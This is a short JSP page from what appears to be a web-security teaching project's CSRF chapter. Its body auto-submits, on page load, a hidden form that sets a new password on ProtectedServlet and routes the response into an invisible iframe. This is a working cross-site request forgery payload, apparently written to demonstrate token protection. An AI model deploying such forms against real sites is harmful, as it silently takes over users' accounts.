<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<%@ page import="de.dominikschadow.webappsecurity.token.CSRFTokenHandler" %>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Chapter 08 - CSRF</title>
    <link rel="stylesheet" type="text/css" href="resources/css/styles.css" />
</head>
<body onload="document.changePasswordForm.submit()">
    <h1>Chapter 08 - CSRF: Hidden Form</h1>

    <form action="ProtectedServlet" name="changePasswordForm" method="POST" target="hiddenFrame">
        <input type="hidden" name="newPassword" value="HiddenForm">
        <input type="hidden" name="confirmPassword" value="HiddenForm">
    </form>

    <p><a href="requests-protected.html">Back</a></p>

    <iframe name="hiddenFrame" style="display: none;"></iframe>
</body>
</html>